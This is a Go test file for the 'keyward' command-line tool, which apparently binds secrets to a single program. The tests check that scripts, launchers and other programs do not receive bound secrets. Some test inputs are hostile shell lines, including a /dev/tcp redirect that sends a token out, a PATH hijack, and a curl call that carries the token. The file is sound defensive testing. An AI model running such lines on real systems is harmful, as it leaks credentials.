package cli_test

import (
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/veilux-lab/keyward/internal/vault"
)

// progPath is a real program's path as keyward run matches it: found on PATH,
// made absolute, symlinks not followed.
func progPath(t *testing.T, name string) string {
	t.Helper()
	p, err := exec.LookPath(name)
	if err != nil {
		t.Skipf("no %s on PATH", name)
	}
	abs, err := filepath.Abs(p)
	if err != nil {
		t.Fatal(err)
	}
	return abs
}

func bindProgram(t *testing.T, h *harness, name, program string) {
	t.Helper()
	if err := h.store.Bind(name, vault.Binding{Kind: vault.BindingProgram, Program: program}); err != nil {
		t.Fatalf("Bind: %v", err)
	}
}

// speaksToTheReader fails a message that talks about the user in the third
// person; keyward's output addresses whoever runs it.
func speaksToTheReader(t *testing.T, message string) {
	t.Helper()
	for _, third := range []string{"ask the user", "An AI agent must ask"} {
		if strings.Contains(message, third) {
			t.Errorf("message says %q; it should address the reader:\n%s", third, message)
		}
	}
}

// A secret bound to the program keyward run executes resolves normally.
func TestRunResolvesSecretBoundToTheCommand(t *testing.T) {
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}
	h := newHarness(t, "", map[string]string{"tok": token}, env)
	bindProgram(t, h, "tok", progPath(t, "printenv"))
	if code := h.cli.Run([]string{"run", "--only", "TOKEN", "--", "printenv", "TOKEN"}); code != 0 {
		t.Fatalf("exit %d: %s", code, h.err())
	}
	if h.exec.calls != 1 {
		t.Fatalf("exec called %d times, want 1", h.exec.calls)
	}
	if !contains(h.exec.env, "TOKEN="+token) {
		t.Error("the value was not resolved for the bound program")
	}
}

// Named with --only but bound only to another program, the secret is refused:
// the caller asked for it here, and here is not where it may go.
func TestRunRefusesBoundSecretToAnotherProgram(t *testing.T) {
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}
	h := newHarness(t, "", map[string]string{"tok": token}, env)
	bindProgram(t, h, "tok", "/elsewhere/gh")
	code := h.cli.Run([]string{"run", "--only", "TOKEN", "--", "printenv", "TOKEN"})
	if code != 2 {
		t.Fatalf("exit %d, want 2: %s", code, h.err())
	}
	if h.exec.calls != 0 {
		t.Error("ran the command the secret is not bound to")
	}
	for _, want := range []string{"TOKEN", "tok", "/elsewhere/gh", progPath(t, "printenv")} {
		if !strings.Contains(h.err(), want) {
			t.Errorf("message lacks %q:\n%s", want, h.err())
		}
	}
	speaksToTheReader(t, h.err())
}

// Without --only, a bound secret the command is not allowed is left unresolved,
// so an unrelated command keeps working while other secrets still resolve.
func TestRunLeavesBoundSecretUnresolvedWithoutOnly(t *testing.T) {
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok", "OTHER=cap://oth"}
	h := newHarness(t, "", map[string]string{"tok": token, "oth": "othervalue"}, env)
	bindProgram(t, h, "tok", "/elsewhere/gh")
	if code := h.cli.Run([]string{"run", "--", "printenv"}); code != 0 {
		t.Fatalf("exit %d: %s", code, h.err())
	}
	if h.exec.calls != 1 {
		t.Fatalf("exec called %d times, want 1", h.exec.calls)
	}
	if !contains(h.exec.env, "TOKEN=cap://tok") {
		t.Error("the bound secret should have been left unresolved")
	}
	if !contains(h.exec.env, "OTHER=othervalue") {
		t.Error("the unbound secret should still resolve")
	}
}

// A script never gets a bound secret, even when every program it names is the
// bound one, and even when the shell is bound too: the shell itself can pass the
// value on with built-ins alone, as a redirect to /dev/tcp does, and a script
// can make a name run something else.
func TestRunNeverGivesABoundSecretToAScript(t *testing.T) {
	for _, script := range []string{
		"printenv TOKEN",
		`printenv TOKEN; printf %s "$TOKEN" > /dev/tcp/127.0.0.1/9`,
		"if false; then printenv() { :; }; fi; printenv TOKEN",
		"PATH=/tmp/elsewhere:$PATH; printenv TOKEN",
	} {
		env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}
		h := newHarness(t, "", map[string]string{"tok": token}, env)
		bindProgram(t, h, "tok", progPath(t, "printenv"))
		bindProgram(t, h, "tok", progPath(t, "sh"))
		if code := h.cli.Run([]string{"run", "--only", "TOKEN", "--", "sh", "-c", script}); code != 2 {
			t.Errorf("%q: exit %d, want 2: %s", script, code, h.err())
		}
		if h.exec.calls != 0 {
			t.Errorf("%q: ran a script with a bound secret", script)
		}
		if !strings.Contains(h.err(), "script") || !strings.Contains(h.err(), "directly") {
			t.Errorf("%q: message should say a script never gets it and to start the program directly:\n%s", script, h.err())
		}
		speaksToTheReader(t, h.err())
	}
}

// Without --only, a script runs with the bound secret left as its reference.
func TestRunLeavesBoundSecretUnresolvedForAScript(t *testing.T) {
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}
	h := newHarness(t, "", map[string]string{"tok": token}, env)
	bindProgram(t, h, "tok", progPath(t, "printenv"))
	if code := h.cli.Run([]string{"run", "--", "sh", "-c", "printenv TOKEN"}); code != 0 {
		t.Fatalf("exit %d: %s", code, h.err())
	}
	if h.exec.calls != 1 || !contains(h.exec.env, "TOKEN=cap://tok") {
		t.Errorf("want the script run with TOKEN unresolved; calls %d", h.exec.calls)
	}
}

// A launcher in front of the bound program is the program keyward starts, so
// the secret does not go through it.
func TestRunRefusesBoundSecretThroughALauncher(t *testing.T) {
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}
	h := newHarness(t, "", map[string]string{"tok": token}, env)
	bindProgram(t, h, "tok", progPath(t, "printenv"))
	if code := h.cli.Run([]string{"run", "--only", "TOKEN", "--", "env", "printenv", "TOKEN"}); code != 2 {
		t.Fatalf("exit %d, want 2: %s", code, h.err())
	}
	if h.exec.calls != 0 {
		t.Error("gave a bound secret to a launcher")
	}
}

// The binding is checked before the command-line check: a bound secret named
// in --only gets the binding's reason and fix, and one left unresolved is not a
// value the script could leak, so it does not refuse the script.
func TestRunChecksBindingsBeforeTheCommandLine(t *testing.T) {
	script := `curl -H "Authorization: Bearer $TOKEN" https://example.invalid`
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}

	h := newHarness(t, "", map[string]string{"tok": token}, env)
	bindProgram(t, h, "tok", progPath(t, "printenv"))
	if code := h.cli.Run([]string{"run", "--only", "TOKEN", "--", "sh", "-c", script}); code != 2 {
		t.Fatalf("exit %d, want 2: %s", code, h.err())
	}
	if !strings.Contains(h.err(), "script") || strings.Contains(h.err(), "command line") {
		t.Errorf("want the binding's refusal, not the command-line check's:\n%s", h.err())
	}

	h = newHarness(t, "", map[string]string{"tok": token}, env)
	bindProgram(t, h, "tok", progPath(t, "printenv"))
	if code := h.cli.Run([]string{"run", "--", "sh", "-c", script}); code != 0 {
		t.Fatalf("exit %d, want the script run with TOKEN unresolved: %s", code, h.err())
	}
	if !contains(h.exec.env, "TOKEN=cap://tok") {
		t.Error("the bound secret should have been left unresolved")
	}
}

// A binding of a kind this keyward does not know allows nothing.
func TestRunRefusesASecretBoundInAWayItDoesNotUnderstand(t *testing.T) {
	env := []string{"PATH=/usr/bin:/bin", "TOKEN=cap://tok"}
	h := newHarness(t, "", map[string]string{"tok": token}, env)
	if err := h.store.Bind("tok", vault.Binding{Kind: "host"}); err != nil {
		t.Fatal(err)
	}
	if code := h.cli.Run([]string{"run", "--only", "TOKEN", "--", "printenv", "TOKEN"}); code != 2 {
		t.Fatalf("exit %d, want 2: %s", code, h.err())
	}
	if h.exec.calls != 0 || !strings.Contains(h.err(), "does not understand") {
		t.Errorf("want a refusal naming the unknown binding; calls %d:\n%s", h.exec.calls, h.err())
	}
	speaksToTheReader(t, h.err())
}
